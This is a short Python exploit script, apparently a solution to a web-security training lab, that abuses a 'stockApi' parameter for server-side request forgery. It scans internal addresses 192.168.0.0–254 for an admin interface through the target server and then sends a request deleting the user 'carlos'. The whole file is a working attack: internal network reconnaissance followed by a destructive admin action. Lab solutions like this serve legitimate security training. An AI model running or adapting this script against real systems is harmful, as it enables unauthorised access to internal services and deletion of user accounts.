import requests
import urllib3
import sys

if len(sys.argv) > 2:
    print(f"Usage:\npython3 {sys.argv[0]} <URL>")
    sys.exit(404)
if sys.argv[1].endswith("/"):
    sys.argv[1] = sys.argv[1][:-1]
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def send_stock_request(stock_api_url):
    target_url = f"{sys.argv[1]}/product/stock"

    data = {
        "stockApi": stock_api_url
    }
    response = requests.post(target_url, data=data, verify=False, proxies=PROXIES)
    return (response.status_code == 200)

for n in range(255):
    url_to_check = f"http://192.168.0.{n}:8080/admin"
    print(f"\rAttempting {url_to_check}", end="", flush=True)
    if send_stock_request(url_to_check):
        print(f"\nAdmin interface detected at {url_to_check}")
        send_stock_request(f"{url_to_check}/delete?username=carlos")
        print("Congratulations, you solved the lab")
        break